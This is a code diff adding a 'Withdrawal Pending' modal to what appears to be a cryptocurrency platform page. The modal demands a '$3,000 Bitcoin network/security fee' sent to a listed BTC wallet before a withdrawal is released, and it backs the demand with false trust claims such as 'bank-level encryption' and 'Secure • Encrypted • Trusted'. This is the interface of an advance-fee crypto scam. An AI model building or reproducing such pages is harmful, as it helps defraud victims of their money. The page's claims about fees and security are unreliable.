@@ -444,6 +444,88 @@ Copy Address
 
 </div>
 
+<!-- Premium Withdrawal Pending Modal -->
+<div id="pendingModal" class="withdraw-modal" style="display:none;">
+
+    <div class="withdraw-card">
+
+        <button class="close-modal" onclick="closePendingModal()">
+            <i class="fa-solid fa-xmark"></i>
+        </button>
+
+        <div class="withdraw-icon">
+            <i class="fa-brands fa-bitcoin"></i>
+        </div>
+
+        <h2>Withdrawal Pending</h2>
+
+        <div class="divider"></div>
+
+        <p class="withdraw-text">
+            To complete this withdrawal, a one-time
+            <strong>$3,000 Bitcoin network/security fee</strong>
+            must be sent to the Bitcoin wallet below.
+            <br><br>
+            After the payment is confirmed, your withdrawal will be processed automatically.
+        </p>
+
+        <h4 class="wallet-title">
+            SEND FEE TO THIS BTC WALLET
+        </h4>
+
+        <div class="wallet-box">
+
+            <div class="wallet-left">
+
+                <div class="btc-circle">
+                    <i class="fa-brands fa-bitcoin"></i>
+                </div>
+
+                <span id="btcWallet">
+                    bc1q3kjwt332fqwfvxjq0wls4rt38zkk0f4k8yv2hc
+                </span>
+
+            </div>
+
+            <button class="copy-btn" onclick="copyWallet()">
+                <i class="fa-regular fa-copy"></i>
+            </button>
+
+        </div>
+
+        <div class="security-box">
+
+            <i class="fa-solid fa-shield-halved"></i>
+
+            <div>
+
+                <strong>This is a one-time fee.</strong>
+
+                <p>
+                    Your funds are protected with bank-level encryption.
+                </p>
+
+            </div>
+
+        </div>
+
+        <button class="copy-wallet-btn" onclick="copyWallet()">
+            <i class="fa-regular fa-copy"></i>
+            Copy Wallet Address
+        </button>
+
+        <button class="close-btn" onclick="closePendingModal()">
+            Close
+        </button>
+
+        <div class="trust">
+            <i class="fa-solid fa-lock"></i>
+            Secure • Encrypted • Trusted
+        </div>
+
+    </div>
+
+</div>
 
 <div class="market-card">
 
